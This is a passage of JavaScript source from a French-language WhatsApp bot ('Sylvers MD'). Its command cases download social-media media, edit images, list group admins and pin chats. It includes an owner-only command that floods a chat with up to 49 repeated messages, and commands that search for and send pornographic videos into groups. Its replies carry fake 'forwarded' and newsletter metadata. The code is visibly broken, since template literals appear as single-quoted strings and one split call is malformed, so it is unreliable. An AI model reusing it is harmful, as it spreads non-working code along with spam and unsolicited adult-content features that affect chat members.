          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🙏\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    replygckev('Erreur: ${error.message}')
  }
  }
  break
  case 'traduction':{
  	if (!q) return replygckev('*Veuillez entrer le texte*\n\n*𝙴Exemple usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} we the best*')
  	const defaultLang = 'fr'
const tld = 'cn'
    let err = '
 *Exemple:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *Liste des langues disponibles:* 
https://cloud.google.com/translate/docs/languages
'.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: result.text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🌿\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
    } catch (e) {
        return replygckev(err)
    } 
    }
    break
  case 'mediafire': {
  	if (!args[0]) return replygckev('Veuillez entrer le lien mediafire juste apes la commande')
    if (!args[0].match(/mediafire/gi)) return replygckev('Lien incorrecte')
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = '
   ≡ *MEDIAFIRE*

▢ *Numero:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
'.trim()
    Kev.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
    }
    break
case 'tag_admin': case 'liste_admin': case 'admin':{
    	if (!m.isGroup) return KevStickGroup()
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => '${i + 1}. @${v.id.split('@')[0]}').join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split'-'[0] + '@s.whatsapp.net'
    let text = '   
*Groupe  D'admins:*
${listAdmin}
'.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Menu 🚀\",\"id\":\"${prefix}menu"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [...groupAdmins.map(v => v.id), owner],
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
   
}
break
case 'instagram': case 'ig': case 'ig_video': case 'ig_image': case 'igvid': case 'igimg': {
	  if (!text) return replygckev('Veuillez entrer le lien de la video image reel Instagram')
  let res
  try {
    res = await fetch('https://www.guruapi.tech/api/igdlv1?url=${text}')
  } catch (error) {
    return replygckev('Une erreur est survenue: ${error.message}')
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return replygckev('fichier introuvable.')
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = 'Voici ${mediaType.toUpperCase()}'
    if (mediaType === 'video') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: mediaURL}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice ✨\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
    } else if (mediaType === 'image') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: mediaURL}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice ✨\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
    }
  }
}
break
case 'removebg': case 'nobg':{
if (!quoted) return replygckev('Veuillez repondre a une image ${prefix + command}')
if (!/image/.test(mime)) return replygckev('Veuillez repondre a une image ${prefix + command}')
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch('https://aemt.me/removebg?url=${url}')
let data = await anu.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'We The Best!'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: data.result}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice ✨\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case'en_zombie':{
if (!quoted) return replygckev('Veuillez repondre a une image ${prefix + command}')
if (!/image/.test(mime)) return replygckev('Veuillez repondre a une image ${prefix + command}')
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch('https://aemt.me/converter/zombie?url=${url}')
let data = await anu.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'We The Best!'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice ✨\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case'en_anime':{
if (!quoted) return replygckev('Veuillez repondre a une image ${prefix + command}')
if (!/image/.test(mime)) return replygckev('Veuillez repondre a une image ${prefix + command}')
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let gpt = await (await fetch('https://itzpire.com/tools/jadianime?url=${url}')).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'We The Best!'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url:gpt.result}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice ✨\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'capcut':{
if (!text) return replygckev('Veuillez entrer un lien\nExemple\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID')
await Kev.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson('https://aemt.me/download/capcut?url=${text}')
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'We The Best!'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: anu.result.video_ori}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice ✨\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
await Kev.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await Kev.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break 
case 'smeme': case 'sticker_meme': case 'stickmeme': {

if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replygckev('Usage: ${prefix + command} text1|text2')
let { TelegraPh } = require('./bibliotheque/uploader')

atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await Kev.downloadAndSaveMediaMessage(quoted)

mem = await TelegraPh(mee)

meme = 'https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}'

memek = await Kev.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })


} else {
replygckev('Veuillez repondre a une image ${prefix + command} text1|text2')
}
}

break

case'smeta': {
if (!/webp/.test(mime)) return replygckev('Veuillez repondre a un sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await Kev.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replygckev('Veuillez repondre a un sticker!')
                                    var stiker = await addExifAvatar(img, 'Made by', 'Sylvers MD')
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) Kev.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replygckev('Veuilez repondre a un sticker')
                                                                              }
                                                                              }       
                                                                              break
case 'instagram2': case 'ig2':{
if (!text) return replygckev('Veuillez entrer le lien!!!')
if (!isUrl(args[0])) return replygckev('Le lien?')
await Kev.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{   
let anu = await fetchJson('https://aemt.me/download/igdl?url=${text}')
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'We The Best !'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: anu.result[0].url }}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice ✨\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
await Kev.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})  
}catch (error) {
await Kev.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
case 'itunes': {
if (!text) return replygckev('Veuillez entrer le titre de la chanson')
  try {
    let res = await fetch('https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}')
    if (!res.ok) {
      throw new Error('API request failed with status ${res.status}')
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let songInfo = 
    '*Information de la chanson :*\n
     • *Nom:* ${json.name}\n
     • *Artiste :* ${json.artist}\n
     • *Album:* ${json.album}\n
     • *Date:* ${json.release_date}\n
     • *Prix:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}'
    // Check if thumbnail is present, then send it with songInfo as caption
    if (json.thumbnail) {
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: songInfo
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({image: {url:json.thumbnail}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice ✨\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
    } else {
      replygckev(songInfo)
    }
  } catch (error) {
    console.error(error)
  }
}
break
case 'spam':
				if (!KevTheCreator) return KevStickOwner()
					if (!text) return replygckev('Usage ${prefix +command} texte|nombre')
				kevarg = text.split("|")
				if (!kevarg) return replygckev('Usage ${prefix+ command} texte|nombre')
				if (Number(kevarg[1]) >= 50) return replygckev('Max 50!')
				if (isNaN(kevarg[1])) return replygckev('plus qu.un nombre')
				for (let i = 0; i < kevarg[1]; i++){
					Kev.sendMessage(from, {text: kevarg[0]})
				}
				break
case 'simi_simi': case 'simi':
if (!text) replygckev('Veuillez entrer votre  question')
let simi = await fetchJson('https://aemt.me/simi?text=${text}')
const simi2 = simi.result
Kev.sendMessage(m.chat, {text: simi2}, {quoted: m})
break
case 'tout_effacer': {
if (!KevTheCreator) return KevStickOwner()
Kev.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'epingler': {
if (!KevTheCreator) return KevStickOwner()
if (m.isGroup) return KevStickPrivate()
Kev.chatModify({ pin: true }, m.chat)
}
break
case 'desepingler': {
if (!KevTheCreator) return KevStickOwner()
if (m.isGroup) return KevStickPrivate()
Kev.chatModify({ pin: false }, m.chat)
}
break
case 'database': {
if (!KevTheCreator) return KevStickOwner()
totalreg = Object.keys(global.db.data.users).length
    let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
    replygckev('*${totalreg} Utilisent le Bot*')
}
break 
case 'voir_demandeintegration':{
	if (!m.isGroup) return KevStickGroup()
	if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
	const response = await Kev.groupRequestParticipantsList(m.chat);
  if (!response || !response.length) {
    Kev.sendMessage(m.chat, {text: 'pas de demande a examiner. ✅'}, {quoted:m});
    return;
  }
  let replyMessage = '${themeemoji} Liste De Demandes D'integration :\n';
  response.forEach((request, index) => {
    const { jid, request_method, request_time } = request;
    const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
    replyMessage += '\n*No.: ${index + 1} detail. 👇*';
    replyMessage += '\n🧟‍♂️ *JID:* ${jid}';
    replyMessage += '\n🧪 *Method:* ${request_method}';
    replyMessage += '\n⏰ *Temps:* ${formattedTime}\n';
  });

  Kev.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
};
break
case 'twitter': case 'twitterdl': case 'twitterdl': {
	if (!args[0]) return replygckev('📌 Exemple : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19')
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return replygckev('Lien Invalide!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ' 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────'
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: te
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url:HD}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice ✨\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  	replygckev('Veuillez verifier qu.il s.agisse d'un lien Twitter')
	}
}
break
case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': {
	if (!m.isGroup) return KevStickGroup()
	if (!AntiNsfw) return replygckev(mess.nsfw)
  if (!text) return replygckev('Que voulez vous chercher?\nUsage: *${prefix + command} <search>*\n\nExemple: ${prefix+command} Baise derriere l'amphi\Vous pouvez egalement utiliser un lien\nExemple: ${prefix+command} lien *');
    if (!text) return replygckev('Veuillez entrer une recherche ou un lien valide.');
    // Check if the input is a valid Xvideos URL
    const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
   try {
      if (isURL) {
        // If it's a valid URL, directly download the video
        const result = await xvideosdl(text);
        const { title, url } = result.result; 
        // Send the video file
        const response = await fetch(url);
        const buffer = await response.arrayBuffer();
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'We The Best!!\nTitre: ${title}'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: Buffer.from(buffer)}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"😂💦\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
      } else {
        // If it's not a valid URL, perform a search and display the search results
        const results = await xvideosSearch(text);
        if (results.length === 0) {
          replygckev('Recherche introuvable, veuillez entrer un texte valide.');
        } else {
          const searchResults = results.map((result, index) => {
            return '${index + 1}. *${result.title}*\nDuree: ${result.duration}\nQualitey: ${result.quality}\nURL: ${result.url}';
          }).join('\n\n');  
          let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '*Search Results for "${text}":*\n\n${searchResults}'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"😂\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
        }
      }
    } catch (error) {
      console.error(error);
      return replygckev('Requete echouee.');
    }
  };
  break
  case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
  if (!m.isGroup) return KevStickGroup()
	if (!AntiNsfw) return replygckev(mess.nsfw)
  if (!text)
    return replygckev('Que voulez-vous chercher ?\nUsage: *${prefix + command} <search>*\n\nExemple: Baise derriere l'amphi\nVous pouvez egalement utiliser un lien\nExemple: .${prefix + command} lien*')
  let url
  try {
    url = new URL(text)
  } catch (error) {
    url = null
  }
  if (url) {
    try {
      const files = await xnxxdl(url.href)
      if (files && files.high) {
      	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Here you go!!'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: files.high}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"😂💦\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
        Kev.sendMessage(m.chat, {video:{url: files.high}, caption: 'We the Best!!'}, {quoted:m})
      } else {
        replygckev('🔴 Erreur: Telechargement echouey.')
      }
    } catch (e) {
      console.error(e)
      replygckev('🔴 Erreur: Nous avons rencontrey un probleme lors du telechargement.')
    }
  } else {
    try {
      const results = await xnxxSearch(text)
      if (results.length > 0) {
        const message = results.map((r, i) => '${i + 1}. [${r.title}](${r.link})').join('\n')
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"😂\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionJid: Kev.parseMention(message),
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
      } else {
        replygckev('🔴 Erreur: recherche introuvable.')
      }
    } catch (e) {
      console.error(e)
      replygckev('🔴 Erreur: Nous avons rencontrey un probleme lors du telechargement.')
    }
  }
}
break
case 'apk': {
	try {
    if (command === 'apk') {
      if (!text) return replygckev('*[❗] Veuillez entrer le nom de l'apk desiree.*');
      let data = await download(text);
      if (data.size.replace(' MB', '') > 200) {
        return await Kev.sendMessage(m.chat, { text: '*[⛔] le fichier est trop grand.*' }, { quoted: m });
      }
      if (data.size.includes('GB')) {
